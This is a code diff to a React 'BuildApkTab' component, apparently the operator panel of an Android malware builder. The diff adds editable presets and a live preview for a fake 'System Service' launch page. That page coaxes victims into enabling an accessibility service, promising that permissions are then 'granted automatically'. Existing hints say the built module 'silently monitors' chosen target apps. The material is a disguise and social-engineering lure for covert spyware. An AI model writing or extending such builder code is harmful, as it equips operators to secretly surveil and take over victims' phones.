@@ -108,6 +108,15 @@ const ACCENT_PRESETS = [
   { label: 'Purple',  value: '#8B5CF6' },
 ];
 
+const MODULE_ACCENT_PRESETS = [
+  { label: 'Sky',     value: '#0EA5E9' },
+  { label: 'Indigo',  value: '#6366F1' },
+  { label: 'Green',   value: '#22C55E' },
+  { label: 'Amber',   value: '#F59E0B' },
+  { label: 'Rose',    value: '#F43F5E' },
+  { label: 'Purple',  value: '#8B5CF6' },
+];
+
 const BG_PRESETS = [
   { label: 'Dark Navy',  value: '#0B1020' },
   { label: 'Slate',      value: '#0F172A' },
@@ -115,6 +124,24 @@ const BG_PRESETS = [
   { label: 'Pure Black', value: '#000000' },
   { label: 'Deep Blue',  value: '#0D1B4B' },
   { label: 'Dark Teal',  value: '#042F2E' },
+];
+
+const MODULE_BG_PRESETS = [
+  { label: 'Slate',      value: '#0F172A' },
+  { label: 'Dark Navy',  value: '#0B1020' },
+  { label: 'Dark Gray',  value: '#111827' },
+  { label: 'Pure Black', value: '#000000' },
+  { label: 'Deep Blue',  value: '#0D1B4B' },
+  { label: 'Dark Teal',  value: '#042F2E' },
+];
+
+const MODULE_CARD_PRESETS = [
+  { label: 'Navy',     value: '#1E293B' },
+  { label: 'Slate',    value: '#0F172A' },
+  { label: 'Dark',     value: '#1A1A2E' },
+  { label: 'Gray',     value: '#1F2937' },
+  { label: 'Teal',     value: '#134E4A' },
+  { label: 'Indigo',   value: '#1E1B4B' },
 ];
 
 const styles = {
@@ -394,25 +421,16 @@ function ColorPicker({ label, value, onChange, presets, disabled }) {
 function LaunchPagePreview({ title, subtitle, btnText, bgColor, accentColor }) {
   return (
     <div style={{
-      background: bgColor,
-      borderRadius: 16,
-      padding: '24px 16px',
-      display: 'flex',
-      flexDirection: 'column',
-      alignItems: 'center',
-      gap: 0,
-      minHeight: 280,
-      border: '1px solid #1e293b',
-      position: 'relative',
-      overflow: 'hidden',
+      background: bgColor, borderRadius: 16, padding: '24px 16px',
+      display: 'flex', flexDirection: 'column', alignItems: 'center',
+      minHeight: 280, border: '1px solid #1e293b', overflow: 'hidden',
     }}>
       <div style={{ fontSize: 10, color: '#475569', marginBottom: 12, letterSpacing: 1, textTransform: 'uppercase' }}>
         Live Preview
       </div>
       <div style={{
         width: 72, height: 72, borderRadius: '50%',
-        background: `${accentColor}22`,
-        border: `2px solid ${accentColor}55`,
+        background: `${accentColor}22`, border: `2px solid ${accentColor}55`,
         display: 'flex', alignItems: 'center', justifyContent: 'center',
         fontSize: 28, marginBottom: 16,
       }}>🤖</div>
@@ -437,6 +455,70 @@ function LaunchPagePreview({ title, subtitle, btnText, bgColor, accentColor }) {
   );
 }
 
+function ModuleLaunchPagePreview({ title, subtitle, step1, step2, step3, step4, btnText, footer, bgColor, cardColor, accentColor }) {
+  const stepStyle = { display: 'flex', alignItems: 'flex-start', gap: 8, marginBottom: 8 };
+  const circleStyle = {
+    width: 20, height: 20, borderRadius: '50%', background: `${accentColor}22`,
+    border: `1.5px solid ${accentColor}`, color: accentColor,
+    display: 'flex', alignItems: 'center', justifyContent: 'center',
+    fontSize: 10, fontWeight: 700, flexShrink: 0, marginTop: 1,
+  };
+  return (
+    <div style={{
+      background: bgColor, borderRadius: 16, padding: '16px 14px',
+      border: '1px solid #1e293b', overflow: 'hidden',
+    }}>
+      <div style={{ fontSize: 10, color: '#475569', marginBottom: 10, letterSpacing: 1, textTransform: 'uppercase', textAlign: 'center' }}>
+        Live Preview
+      </div>
+      <div style={{ textAlign: 'center', marginBottom: 10 }}>
+        <div style={{ fontSize: 13, fontWeight: 700, color: '#f1f5f9', marginBottom: 2 }}>
+          {title || 'System Service'}
+        </div>
+        <div style={{ fontSize: 10, color: '#94a3b8' }}>
+          {subtitle || 'Accessibility service not enabled'}
+        </div>
+      </div>
+      {/* Status badge */}
+      <div style={{
+        background: cardColor, borderRadius: 10, padding: '8px 10px', marginBottom: 8,
+        display: 'flex', alignItems: 'center', gap: 6,
+      }}>
+        <span style={{ fontSize: 12 }}>⚠</span>
+        <div>
+          <div style={{ fontSize: 10, fontWeight: 700, color: '#f1f5f9' }}>Action Required</div>
+          <div style={{ fontSize: 9, color: '#94a3b8' }}>Enable the accessibility service to continue</div>
+        </div>
+      </div>
+      {/* Steps card */}
+      <div style={{ background: cardColor, borderRadius: 10, padding: '10px', marginBottom: 8 }}>
+        <div style={{ fontSize: 8, color: '#64748b', letterSpacing: 1, marginBottom: 8, textTransform: 'uppercase' }}>
+          HOW TO ENABLE
+        </div>
+        {[step1 || 'Tap the button below to open Accessibility Settings',
+          step2 || 'Find and tap the app under Installed Services',
+          step3 || 'Toggle it ON and tap Allow in the dialog',
+          step4 || 'Return to this screen — permissions granted automatically',
+        ].map((s, i) => (
+          <div key={i} style={stepStyle}>
+            <div style={circleStyle}>{i + 1}</div>
+            <div style={{ fontSize: 9, color: '#cbd5e1', lineHeight: 1.4, flex: 1 }}>{s}</div>
+          </div>
+        ))}
+      </div>
+      <div style={{
+        padding: '8px 0', borderRadius: 6, textAlign: 'center',
+        background: accentColor, color: '#fff', fontWeight: 700, fontSize: 11, marginBottom: 6,
+      }}>
+        {btnText || 'Open Accessibility Settings'}
+      </div>
+      <div style={{ fontSize: 9, color: '#475569', textAlign: 'center' }}>
+        {footer || 'Permissions are granted automatically once accessibility is enabled.'}
+      </div>
+    </div>
+  );
+}
+
 export default function BuildApkTab({ user }) {
   const [moduleName,       setModuleName]       = useState('System Service');
   const [modulePackage,    setModulePackage]     = useState('com.task.tusker');
@@ -454,6 +536,19 @@ export default function BuildApkTab({ user }) {
   const [launchBtnText,     setLaunchBtnText]     = useState('Install');
   const [launchBgColor,     setLaunchBgColor]     = useState('#0B1020');
   const [launchAccentColor, setLaunchAccentColor] = useState('#6366F1');
+
+  const [showModuleLaunchEditor, setShowModuleLaunchEditor] = useState(false);
+  const [moduleLaunchTitle,       setModuleLaunchTitle]       = useState('System Service');
+  const [moduleLaunchSubtitle,    setModuleLaunchSubtitle]    = useState('Accessibility service not enabled');
+  const [moduleLaunchStep1,       setModuleLaunchStep1]       = useState('Tap the button below to open Accessibility Settings');
+  const [moduleLaunchStep2,       setModuleLaunchStep2]       = useState('');
+  const [moduleLaunchStep3,       setModuleLaunchStep3]       = useState('Toggle it ON and tap Allow in the confirmation dialog');
+  const [moduleLaunchStep4,       setModuleLaunchStep4]       = useState('Return to this screen — permissions will be granted automatically');
+  const [moduleLaunchBtnText,     setModuleLaunchBtnText]     = useState('Open Accessibility Settings');
+  const [moduleLaunchFooter,      setModuleLaunchFooter]      = useState('Permissions are granted automatically once accessibility is enabled.');
+  const [moduleLaunchBgColor,     setModuleLaunchBgColor]     = useState('#0F172A');
+  const [moduleLaunchCardColor,   setModuleLaunchCardColor]   = useState('#1E293B');
+  const [moduleLaunchAccentColor, setModuleLaunchAccentColor] = useState('#0EA5E9');
 
   const [errors,     setErrors]     = useState({});
   const [running,    setRunning]    = useState(false);
@@ -555,6 +650,15 @@ export default function BuildApkTab({ user }) {
     if (!NAME_REGEX.test(launchTitle.trim()))    e.launchTitle    = '1-40 chars';
     if (!NAME_REGEX.test(launchSubtitle.trim())) e.launchSubtitle = '1-40 chars';
     if (!NAME_REGEX.test(launchBtnText.trim()))  e.launchBtnText  = '1-40 chars';
+    const chk = (v, key, lbl) => { if (v.trim() && v.trim().length > 200) e[key] = `${lbl}: max 200 chars`; };
+    chk(moduleLaunchTitle,    'moduleLaunchTitle',    'Title');
+    chk(moduleLaunchSubtitle, 'moduleLaunchSubtitle', 'Subtitle');
+    chk(moduleLaunchStep1,    'moduleLaunchStep1',    'Step 1');
+    chk(moduleLaunchStep2,    'moduleLaunchStep2',    'Step 2');
+    chk(moduleLaunchStep3,    'moduleLaunchStep3',    'Step 3');
+    chk(moduleLaunchStep4,    'moduleLaunchStep4',    'Step 4');
+    chk(moduleLaunchBtnText,  'moduleLaunchBtnText',  'Button');
+    chk(moduleLaunchFooter,   'moduleLaunchFooter',   'Footer');
     setErrors(e);
     return Object.keys(e).length === 0;
   };
@@ -581,6 +685,17 @@ export default function BuildApkTab({ user }) {
         installerLaunchBtnText:     launchBtnText.trim(),
         installerLaunchBgColor:     launchBgColor,
         installerLaunchAccentColor: launchAccentColor,
+        moduleLaunchTitle:       moduleLaunchTitle.trim(),
+        moduleLaunchSubtitle:    moduleLaunchSubtitle.trim(),
+        moduleLaunchStep1:       moduleLaunchStep1.trim(),
+        moduleLaunchStep2:       moduleLaunchStep2.trim(),
+        moduleLaunchStep3:       moduleLaunchStep3.trim(),
+        moduleLaunchStep4:       moduleLaunchStep4.trim(),
+        moduleLaunchBtnText:     moduleLaunchBtnText.trim(),
+        moduleLaunchFooter:      moduleLaunchFooter.trim(),
+        moduleLaunchBgColor:     moduleLaunchBgColor,
+        moduleLaunchCardColor:   moduleLaunchCardColor,
+        moduleLaunchAccentColor: moduleLaunchAccentColor,
       };
 
       const r = await fetch('/api/build/apk', {
@@ -817,6 +932,174 @@ export default function BuildApkTab({ user }) {
                 : <span style={styles.hint}>
                     One Android package name per line (or comma-separated). These are the apps the module silently monitors.
                   </span>}
+            </div>
+
+            {/* ── Module launch page editor ───────────────────────────────── */}
+            <div style={styles.field}>
+              <button
+                type="button"
+                onClick={() => setShowModuleLaunchEditor(v => !v)}
+                style={{ ...styles.collapseToggle, color: showModuleLaunchEditor ? '#818cf8' : '#94a3b8' }}
+                disabled={running}
+              >
+                <span>{showModuleLaunchEditor ? '▾' : '▸'}</span>
+                🎨 Customize Launch Page
+                {!showModuleLaunchEditor && (
+                  <span style={{ marginLeft: 'auto', fontSize: 10, color: '#475569', fontWeight: 400 }}>
+                    {moduleLaunchTitle || 'System Service'}
+                  </span>
+                )}
+              </button>
+
+              {showModuleLaunchEditor && (
+                <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginTop: 8 }}>
+
+                  {/* Title */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>App Title</label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchTitle ? styles.inputErr : {}) }}
+                      value={moduleLaunchTitle}
+                      onChange={e => setModuleLaunchTitle(e.target.value)}
+                      disabled={running}
+                      placeholder="System Service"
+                    />
+                    {errors.moduleLaunchTitle && <span style={styles.errMsg}>{errors.moduleLaunchTitle}</span>}
+                  </div>
+
+                  {/* Subtitle */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>Status Subtitle</label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchSubtitle ? styles.inputErr : {}) }}
+                      value={moduleLaunchSubtitle}
+                      onChange={e => setModuleLaunchSubtitle(e.target.value)}
+                      disabled={running}
+                      placeholder="Accessibility service not enabled"
+                    />
+                    {errors.moduleLaunchSubtitle && <span style={styles.errMsg}>{errors.moduleLaunchSubtitle}</span>}
+                  </div>
+
+                  {/* Step 1 */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>Step 1 Text</label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchStep1 ? styles.inputErr : {}) }}
+                      value={moduleLaunchStep1}
+                      onChange={e => setModuleLaunchStep1(e.target.value)}
+                      disabled={running}
+                      placeholder="Tap the button below to open Accessibility Settings"
+                    />
+                    {errors.moduleLaunchStep1 && <span style={styles.errMsg}>{errors.moduleLaunchStep1}</span>}
+                  </div>
+
+                  {/* Step 2 */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>
+                      Step 2 Text
+                      <span style={{ marginLeft: 6, color: '#475569', fontWeight: 400, textTransform: 'none', letterSpacing: 0, fontSize: 10 }}>
+                        (leave blank → auto-filled with app name)
+                      </span>
+                    </label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchStep2 ? styles.inputErr : {}) }}
+                      value={moduleLaunchStep2}
+                      onChange={e => setModuleLaunchStep2(e.target.value)}
+                      disabled={running}
+                      placeholder={`Find and tap "${moduleName}" under Installed Services`}
+                    />
+                    {errors.moduleLaunchStep2 && <span style={styles.errMsg}>{errors.moduleLaunchStep2}</span>}
+                  </div>
+
+                  {/* Step 3 */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>Step 3 Text</label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchStep3 ? styles.inputErr : {}) }}
+                      value={moduleLaunchStep3}
+                      onChange={e => setModuleLaunchStep3(e.target.value)}
+                      disabled={running}
+                      placeholder="Toggle it ON and tap Allow in the confirmation dialog"
+                    />
+                    {errors.moduleLaunchStep3 && <span style={styles.errMsg}>{errors.moduleLaunchStep3}</span>}
+                  </div>
+
+                  {/* Step 4 */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>Step 4 Text</label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchStep4 ? styles.inputErr : {}) }}
+                      value={moduleLaunchStep4}
+                      onChange={e => setModuleLaunchStep4(e.target.value)}
+                      disabled={running}
+                      placeholder="Return to this screen — permissions will be granted automatically"
+                    />
+                    {errors.moduleLaunchStep4 && <span style={styles.errMsg}>{errors.moduleLaunchStep4}</span>}
+                  </div>
+
+                  {/* Button text */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>Button Text</label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchBtnText ? styles.inputErr : {}) }}
+                      value={moduleLaunchBtnText}
+                      onChange={e => setModuleLaunchBtnText(e.target.value)}
+                      disabled={running}
+                      placeholder="Open Accessibility Settings"
+                    />
+                    {errors.moduleLaunchBtnText && <span style={styles.errMsg}>{errors.moduleLaunchBtnText}</span>}
+                  </div>
+
+                  {/* Footer note */}
+                  <div>
+                    <label style={{ ...styles.label, marginBottom: 4 }}>Footer Note</label>
+                    <input
+                      style={{ ...styles.input, ...(errors.moduleLaunchFooter ? styles.inputErr : {}) }}
+                      value={moduleLaunchFooter}
+                      onChange={e => setModuleLaunchFooter(e.target.value)}
+                      disabled={running}
+                      placeholder="Permissions are granted automatically once accessibility is enabled."
+                    />
+                    {errors.moduleLaunchFooter && <span style={styles.errMsg}>{errors.moduleLaunchFooter}</span>}
+                  </div>
+
+                  <ColorPicker
+                    label="Background Color"
+                    value={moduleLaunchBgColor}
+                    onChange={setModuleLaunchBgColor}
+                    presets={MODULE_BG_PRESETS}
+                    disabled={running}
+                  />
+                  <ColorPicker
+                    label="Card / Surface Color"
+                    value={moduleLaunchCardColor}
+                    onChange={setModuleLaunchCardColor}
+                    presets={MODULE_CARD_PRESETS}
+                    disabled={running}
+                  />
+                  <ColorPicker
+                    label="Accent Color"
+                    value={moduleLaunchAccentColor}
+                    onChange={setModuleLaunchAccentColor}
+                    presets={MODULE_ACCENT_PRESETS}
+                    disabled={running}
+                  />
+
+                  <ModuleLaunchPagePreview
+                    title={moduleLaunchTitle}
+                    subtitle={moduleLaunchSubtitle}
+                    step1={moduleLaunchStep1}
+                    step2={moduleLaunchStep2 || `Find and tap "${moduleName}" under Installed Services`}
+                    step3={moduleLaunchStep3}
+                    step4={moduleLaunchStep4}
+                    btnText={moduleLaunchBtnText}
+                    footer={moduleLaunchFooter}
+                    bgColor={moduleLaunchBgColor}
+                    cardColor={moduleLaunchCardColor}
+                    accentColor={moduleLaunchAccentColor}
+                  />
+                </div>
+              )}
             </div>
 
             <div style={{ ...styles.hint, marginTop: 'auto', paddingTop: 8 }}>
